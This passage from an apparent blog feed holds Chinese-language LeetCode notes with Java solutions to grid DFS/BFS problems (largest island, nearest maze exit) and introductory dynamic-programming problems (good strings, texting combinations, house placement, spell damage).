class="type">int</span> preJ, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">char</span> letter)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (res || i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || grid[i][j] != letter) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (visited[i][j]) &#123;</span><br><span class="line">            res = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">directionNum</span> <span class="operator">=</span> <span class="number">0</span>; directionNum &lt; <span class="number">4</span>; directionNum++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newI</span> <span class="operator">=</span> i + dx[directionNum];</span><br><span class="line">            <span class="type">int</span> <span class="variable">newJ</span> <span class="operator">=</span> j + dy[directionNum];</span><br><span class="line">            <span class="keyword">if</span> (newI == preI &amp;&amp; newJ == preJ) <span class="keyword">continue</span>;</span><br><span class="line">            dfs(grid, visited, i, j, newI, newJ, m, n, letter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo:学下并查集和bfs做法</p>
<h3 id="827-最大人工岛"><a href="#827-最大人工岛" class="headerlink" title="827. 最大人工岛"></a><a href="https://leetcode.cn/problems/making-a-large-island/">827. 最大人工岛</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先给所有区域编号，分别计算其面积。</span><br><span class="line">然后遍历所有零计算上下左右区域的面积（需要去重）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">landNum</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">getLandNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> landNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">addAndGetLandNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ++landNum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">largestIsland</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    dfs(grid, i, j, m, n, addAndGetLandNum());</span><br><span class="line">                    map.put(getLandNum(), area);</span><br><span class="line">                    res = Integer.max(res, area);</span><br><span class="line">                    area = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tot</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                    Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; <span class="number">4</span>; k++) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">newI</span> <span class="operator">=</span> i + dx[k];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">newJ</span> <span class="operator">=</span> j + dy[k];</span><br><span class="line">                        <span class="keyword">if</span>(newI&gt;=<span class="number">0</span>&amp;&amp;newI&lt;m&amp;&amp;newJ&gt;=<span class="number">0</span>&amp;&amp;newJ&lt;n&amp;&amp;grid[newI][newJ] != <span class="number">0</span> &amp;&amp; !set.contains(grid[newI][newJ] - <span class="number">1</span>))&#123;</span><br><span class="line">                            set.add(grid[newI][newJ] - <span class="number">1</span>);</span><br><span class="line">                            tot += map.get(grid[newI][newJ] - <span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    res = Integer.max(res, tot);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] grid, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> landNum)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || grid[i][j] != <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">        area++;</span><br><span class="line">        grid[i][j] += landNum;</span><br><span class="line">        dfs(grid, i - <span class="number">1</span>, j, m, n, landNum);</span><br><span class="line">        dfs(grid, i + <span class="number">1</span>, j, m, n, landNum);</span><br><span class="line">        dfs(grid, i, j - <span class="number">1</span>, m, n, landNum);</span><br><span class="line">        dfs(grid, i, j + <span class="number">1</span>, m, n, landNum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LCP-63-弹珠游戏"><a href="#LCP-63-弹珠游戏" class="headerlink" title="LCP 63. 弹珠游戏"></a><a href="https://leetcode.cn/problems/EXvqDp/">LCP 63. 弹珠游戏</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果直接从边界遍历，复杂度肯定直接寄。逆向思维，从弹珠洞出发bfs即可。但反着w就得顺时针了</span><br><span class="line"></span><br><span class="line">但没说有几个洞，感觉应该只有一个洞吧</span><br></pre></td></tr></table></figure>

<p>代码</p>
<h2 id="网格图-BFS"><a href="#网格图-BFS" class="headerlink" title="网格图 BFS"></a>网格图 BFS</h2><h3 id="1926-迷宫中离入口最近的出口"><a href="#1926-迷宫中离入口最近的出口" class="headerlink" title="1926. 迷宫中离入口最近的出口"></a><a href="https://leetcode.cn/problems/nearest-exit-from-entrance-in-maze/">1926. 迷宫中离入口最近的出口</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bfs即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">nearestExit</span><span class="params">(<span class="type">char</span>[][] maze, <span class="type">int</span>[] entrance)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> maze.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> maze[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        visited[entrance[<span class="number">0</span>]][entrance[<span class="number">1</span>]] = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.addLast(entrance[<span class="number">0</span>] * n + entrance[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sz</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            res++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> deque.pollFirst();</span><br><span class="line">                <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> num / n;</span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> num % n;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">newR</span> <span class="operator">=</span> r + dx[j];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">newC</span> <span class="operator">=</span> c + dy[j];</span><br><span class="line">                    <span class="keyword">if</span> (isInBox(newR, newC, m, n) &amp;&amp; !visited[newR][newC] &amp;&amp; maze[newR][newC] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (isEntrance(newR, newC, m, n)) <span class="keyword">return</span> res;</span><br><span class="line">                        visited[newR][newC] = <span class="literal">true</span>;</span><br><span class="line">                        deque.addLast(newR * n + newC);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isInBox</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (i &gt;= <span class="number">0</span> &amp;&amp; i &lt; m &amp;&amp; j &gt;= <span class="number">0</span> &amp;&amp; j &lt; n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isEntrance</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (i == <span class="number">0</span> || j == <span class="number">0</span> || i == m - <span class="number">1</span> || j == n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode dp</title>
    <url>/2024/06/28/leetcode_dp/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/tXLS3i/">分享丨【题单】动态规划（入门&#x2F;背包&#x2F;状态机&#x2F;划分&#x2F;区间&#x2F;状压&#x2F;数位&#x2F;树形&#x2F;数据结构优化） - 力扣（LeetCode）</a></p>
<p><a href="https://leetcode.cn/circle/discuss/01LUak/">分享丨【题单】图论算法（DFS&#x2F;BFS&#x2F;拓扑排序&#x2F;最短路&#x2F;最小生成树&#x2F;二分图&#x2F;基环树&#x2F;欧拉路径） - 力扣（LeetCode）</a></p>
<p><a href="https://writings.sh/algorithms">算法合集 | 春水煎茶 - 王超的个人博客 (writings.sh)</a></p>
<p><a href="https://www.bilibili.com/read/cv22332590/">如何科学上分？ - 哔哩哔哩 (bilibili.com)</a></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="入门dp"><a href="#入门dp" class="headerlink" title="入门dp"></a>入门dp</h2><h3 id="2466-统计构造好字符串的方案数"><a href="#2466-统计构造好字符串的方案数" class="headerlink" title="2466. 统计构造好字符串的方案数"></a><a href="https://leetcode.cn/problems/count-ways-to-build-good-strings/">2466. 统计构造好字符串的方案数</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你整数 zero ，one ，low 和 high ，我们从空字符串开始构造一个字符串，每一步执行下面操作中的一种：</span><br><span class="line"></span><br><span class="line">将 &#x27;0&#x27; 在字符串末尾添加 zero  次。</span><br><span class="line">将 &#x27;1&#x27; 在字符串末尾添加 one 次。</span><br><span class="line">以上操作可以执行任意次。</span><br><span class="line"></span><br><span class="line">如果通过以上过程得到一个 长度 在 low 和 high 之间（包含上下边界）的字符串，那么这个字符串我们称为 好 字符串。</span><br><span class="line"></span><br><span class="line">请你返回满足以上要求的 不同 好字符串数目。由于答案可能很大，请将结果对 109 + 7 取余 后返回。</span><br></pre></td></tr></table></figure>

<p>分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">既然是dp专题，那肯定就dp分析了。</span><br><span class="line">请你返回满足以上要求的 不同 好字符串数目。由于答案可能很大，请将结果对 109 + 7 取余 后返回。 看到这个结果大小也一般都是dp了</span><br><span class="line"></span><br><span class="line">感觉就是走楼梯</span><br><span class="line">zero就是走 zero步楼梯，one就是走one步楼梯</span><br><span class="line">因此</span><br><span class="line">res = 0</span><br><span class="line">minVal = min(zero, one)</span><br><span class="line">maxVal = max(zero, one)</span><br><span class="line"></span><br><span class="line">初始化</span><br><span class="line">dp[j] = dp[j - maxVal] + dp[j - minVal] % (1e9 + 7)</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countGoodStrings</span><span class="params">(<span class="type">int</span> low, <span class="type">int</span> high, <span class="type">int</span> zero, <span class="type">int</span> one)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> Integer.min(zero, one);</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> Integer.max(zero, one);</span><br><span class="line">        <span class="type">int</span> <span class="variable">modNum</span> <span class="operator">=</span> <span class="number">1000000000</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> [] dp = <span class="keyword">new</span> <span class="title class_">int</span>[high + <span class="number">1</span>];</span><br><span class="line">        dp[minVal] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> minVal * <span class="number">2</span>; j &lt; maxVal; j++)&#123;</span><br><span class="line">            dp[j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxVal % minVal == <span class="number">0</span>)&#123;</span><br><span class="line">            dp[maxVal] = <span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            dp[maxVal] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxVal == low)&#123;</span><br><span class="line">            res += dp[maxVal];</span><br><span class="line">            res %= modNum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> maxVal + <span class="number">1</span>; j &lt;= high; j++)&#123;</span><br><span class="line">            dp[j] = dp[j - maxVal] + dp[j - minVal];</span><br><span class="line">            dp[j] %= modNum;</span><br><span class="line">            <span class="keyword">if</span>(j &gt;= low )&#123;</span><br><span class="line">                res += dp[j];</span><br><span class="line">                res %= modNum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行用时:100%</p>
<p>内存：82.66%</p>
<h3 id="2266-统计打字方案数"><a href="#2266-统计打字方案数" class="headerlink" title="2266. 统计打字方案数"></a><a href="https://leetcode.cn/problems/count-number-of-texts/">2266. 统计打字方案数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分析下发现只需要提取出字符串连续字符的个数，然后结果相乘就好</span><br><span class="line">举个例子</span><br><span class="line">&quot;22233&quot;</span><br><span class="line">分成两部分</span><br><span class="line">222 和 33</span><br><span class="line">然后</span><br><span class="line">222 可以dp计算 dp[1]=&gt;dp[0] dp[2]=dp[0]+dp[1] dp[3]=&gt;dp[0]+ dp[1] + dp[2]即1=&gt;1 2=&gt; 2 3=&gt;4</span><br><span class="line">同理33 1=&gt;1 2=&gt;2</span><br><span class="line">4*2 = 8</span><br><span class="line"></span><br><span class="line">因此其实题目就是爬楼梯</span><br><span class="line">具体过程看代码</span><br><span class="line"></span><br><span class="line">压下空间吧</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countTexts</span><span class="params">(String pressedKeys)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">modNum</span> <span class="operator">=</span> <span class="number">1000000000</span> + <span class="number">7</span>;</span><br><span class="line">    List&lt;Integer&gt; twoCount = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; nineCount = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; pressedKeys.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pressedKeys.charAt(i) != pressedKeys.charAt(i - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pressedKeys.charAt(i - <span class="number">1</span>) != <span class="string">&#x27;7&#x27;</span> &amp;&amp; pressedKeys.charAt(i - <span class="number">1</span>) != <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                twoCount.add(count);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nineCount.add(count);</span><br><span class="line">            &#125;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pressedKeys.charAt(pressedKeys.length() - <span class="number">1</span>) != <span class="string">&#x27;7&#x27;</span> &amp;&amp; pressedKeys.charAt(pressedKeys.length() - <span class="number">1</span>) != <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        twoCount.add(count);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        nineCount.add(count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxTwoLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxNineLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!twoCount.isEmpty()) &#123;</span><br><span class="line">        maxTwoLength = Collections.max(twoCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!nineCount.isEmpty()) &#123;</span><br><span class="line">        maxNineLength = Collections.max(nineCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] dpForNumTwo = <span class="keyword">new</span> <span class="title class_">int</span>[Integer.max(maxTwoLength + <span class="number">1</span>, <span class="number">3</span> + <span class="number">1</span>)];<span class="comment">//省去麻烦</span></span><br><span class="line">    <span class="type">int</span>[] dpForNumNine = <span class="keyword">new</span> <span class="title class_">int</span>[Integer.max(maxNineLength + <span class="number">1</span>, <span class="number">4</span> + <span class="number">1</span>)];<span class="comment">//省去麻烦,之后就不用if判断了</span></span><br><span class="line">    dpForNumTwo[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumTwo[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumTwo[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    dpForNumTwo[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    dpForNumNine[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumNine[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumNine[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    dpForNumNine[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">    dpForNumNine[<span class="number">4</span>] = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">4</span>; i &lt;= maxTwoLength; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= <span class="number">3</span>; j++) &#123;</span><br><span class="line">            dpForNumTwo[i] += dpForNumTwo[i - j];</span><br><span class="line">            dpForNumTwo[i] %= modNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>; i &lt;= maxNineLength; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= <span class="number">4</span>; j++) &#123;</span><br><span class="line">            dpForNumNine[i] += dpForNumNine[i - j];</span><br><span class="line">            dpForNumNine[i] %= modNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : twoCount) &#123;</span><br><span class="line">        res = res * dpForNumTwo[num];</span><br><span class="line">        res %= modNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : nineCount) &#123;</span><br><span class="line">        res = res * dpForNumNine[num];</span><br><span class="line">        res %= modNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>) res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时击败:81.02%</p>
<p>内存击败:87.46%</p>
<h3 id="2320-统计放置房子的方式数"><a href="#2320-统计放置房子的方式数" class="headerlink" title="2320. 统计放置房子的方式数"></a><a href="https://leetcode.cn/problems/count-number-of-ways-to-place-houses/">2320. 统计放置房子的方式数</a></h3><p>题干</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">一条街道上共有 n * <span class="number">2</span> 个 地块 ，街道的两侧各有 n 个地块。每一边的地块都按从 <span class="number">1</span> 到 n 编号。每个地块上都可以放置一所房子。</span><br><span class="line"></span><br><span class="line">现要求街道同一侧不能存在两所房子相邻的情况，请你计算并返回放置房屋的方式数目。由于答案可能很大，需要对 <span class="number">109</span> + <span class="number">7</span> 取余后再返回。</span><br><span class="line"></span><br><span class="line">注意，如果一所房子放置在这条街某一侧上的第 i 个地块，不影响在另一侧的第 i 个地块放置房子。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先肯定是dp，从所在题单和数据需要模数都可以看出</span><br><span class="line"></span><br><span class="line">一个地块只有两个状态，有房子无房子</span><br><span class="line">任何情况都可以选无房子</span><br><span class="line">如果需要选择有房子的话，需要左边一个没有房子（我们从左往右选房子）</span><br><span class="line">设置dp[n+1]数组</span><br><span class="line">初始化dp[0]=1</span><br><span class="line">dp[j]表示总共有j个地块且第j个地块放房子的方案数</span><br><span class="line">递推公式：</span><br><span class="line">dp[j] = sum(dp[i]) for i in [0, j - 2]</span><br><span class="line">res = dp[j](最后放房子) + dp[j-1] (最后不放房子)</span><br><span class="line">最后发现只需要前面两个状态。压缩下空间。详细见代码</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countHousePlacements</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">modNum</span> <span class="operator">=</span> <span class="number">1000000000</span> + <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sumOne</span> <span class="operator">=</span> <span class="number">2</span>;<span class="comment">//2</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sumTwo</span> <span class="operator">=</span> <span class="number">3</span>;<span class="comment">//3</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">3</span>; j &lt; n; j++)&#123;</span><br><span class="line">        cur = sumOne;</span><br><span class="line">        <span class="comment">//更新sumOne、sumTwo</span></span><br><span class="line">        sumOne = sumTwo;</span><br><span class="line">        sumTwo = cur + sumTwo;</span><br><span class="line">        sumTwo %= modNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> sumOne + sumTwo;</span><br><span class="line">    res %= modNum;</span><br><span class="line">    res = (res * res) % modNum;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span> )res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时97.82%</p>
<p>内存59.30%</p>
<h3 id="3186-施咒的最大总伤害"><a href="#3186-施咒的最大总伤害" class="headerlink" title="3186. 施咒的最大总伤害"></a><a href="https://leetcode.cn/problems/maximum-total-damage-with-spell-casting/">3186. 施咒的最大总伤害</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个魔法师有许多不同的咒语。</span><br><span class="line"></span><br><span class="line">给你一个数组 power ，其中每个元素表示一个咒语的伤害值，可能会有多个咒语有相同的伤害值。</span><br><span class="line"></span><br><span class="line">已知魔法师使用伤害值为 power[i] 的咒语时，他们就 不能 使用伤害为 power[i] - 2 ，power[i] - 1 ，power[i] + 1 或者 power[i] + 2 的咒语。</span><br><span class="line"></span><br><span class="line">每个咒语最多只能被使用 一次 。</span><br><span class="line"></span><br><span class="line">请你返回这个魔法师可以达到的伤害值之和的 最大值 。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里分析一下打家劫舍，为什么这样定义https://leetcode.cn/problems/house-robber/solutions/138131/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/</span><br><span class="line">int rob(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    if (nums.size() == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    // 子问题：</span><br><span class="line">    // f(k) = 偷 [0..k) 房间中的最大金额</span><br><span class="line"></span><br><span class="line">    // f(0) = 0</span><br><span class="line">    // f(1) = nums[0]</span><br><span class="line">    // f(k) = max&#123; rob(k-1), nums[k-1] + rob(k-2) &#125;</span><br><span class="line"></span><br><span class="line">    int N = nums.size();</span><br><span class="line">    vector&lt;int&gt; dp(N+1, 0);</span><br><span class="line">    dp[0] = 0;</span><br><span class="line">    dp[1] = nums[0];</span><br><span class="line">    for (int k = 2; k &lt;= N; k++) &#123;</span><br><span class="line">        dp[k] = max(dp[k-1], nums[k-1] + dp[k-2]);</span><br><span class="line">    &#125;</span><br><span class="line">    return dp[N];</span><br><span class="line">&#125;</span><br><span 